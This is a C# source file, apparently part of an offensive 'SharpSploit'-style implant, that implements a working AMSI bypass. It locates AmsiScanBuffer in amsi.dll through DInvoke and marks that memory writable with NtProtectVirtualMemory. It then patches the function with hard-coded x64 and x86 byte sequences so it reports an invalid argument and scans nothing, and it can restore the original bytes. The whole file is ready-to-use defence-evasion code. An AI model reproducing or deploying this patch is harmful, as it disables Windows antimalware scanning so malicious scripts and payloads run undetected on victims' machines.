using System;
using System.Runtime.InteropServices;

namespace Drone.SharpSploit.Evasion
{
    public class Amsi
    {
        private IntPtr _address;
        private byte[] _original;
        
        public void Patch()
        {
            _address = DInvoke.DynamicInvoke.Generic.GetLibraryAddress(
                "amsi.dll",
                "AmsiScanBuffer",
                true);

            var patch = Utilities.IsProcess64Bit ? X64Patch : X86Patch;

            _original = new byte[patch.Length];
            Marshal.Copy(_address, _original, 0, patch.Length);

            var size = (IntPtr)patch.Length; 

            var oldProtect = DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory(
                (IntPtr) (-1),
                ref _address,
                ref size,
                DInvoke.Data.Win32.WinNT.PAGE_READWRITE);
            
            Marshal.Copy(patch, 0, _address, patch.Length);
            
            _ = DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory(
                (IntPtr) (-1),
                ref _address,
                ref size,
                oldProtect);
        }

        public void Restore()
        {
            var size = (IntPtr)_original.Length; 

            var oldProtect = DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory(
                (IntPtr) (-1),
                ref _address,
                ref size,
                DInvoke.Data.Win32.WinNT.PAGE_READWRITE);
            
            Marshal.Copy(_original, 0, _address, _original.Length);
            
            _ = DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory(
                (IntPtr) (-1),
                ref _address,
                ref size,
                oldProtect);
        }

        private static byte[] X64Patch
        {
            get
            {
                var patch = new byte[6];
                
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xC3;

                return patch;
            }
        }

        private static byte[] X86Patch
        {
            get
            {
                var patch = new byte[8];
                
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xC2;
                patch[6] = 0x18;
                patch[7] = 0x00;
                
                return patch;
            }
        }
    }
}